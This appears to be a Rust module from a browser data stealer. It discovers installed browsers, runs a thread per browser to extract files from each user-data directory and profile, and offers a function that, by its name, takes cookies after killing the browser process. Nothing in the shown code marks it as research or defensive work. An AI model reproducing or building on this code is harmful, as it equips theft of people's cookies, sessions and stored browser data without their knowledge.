pub mod base;


pub fn extract_all() -> Vec<(String, String)> {
    use crate::browsers::common::paths;
    let installed = paths::discover_installed_browsers();
    let handles: Vec<_> = installed
        .into_iter()
        .map(|browser| {
            std::thread::spawn(move || {
                let user_data = paths::user_data_path(&browser);
                base::extract_for_browser(&browser.name, &user_data, browser.has_profiles)
            })
        })
        .collect();

    let mut results = Vec::new();
    for handle in handles {
        if let Ok(files) = handle.join() {
            results.extend(files);
        }
    }
    results
}

pub fn extract_cookies_post_kill() -> Vec<(String, String)> {
    base::extract_cookies_post_kill()
}
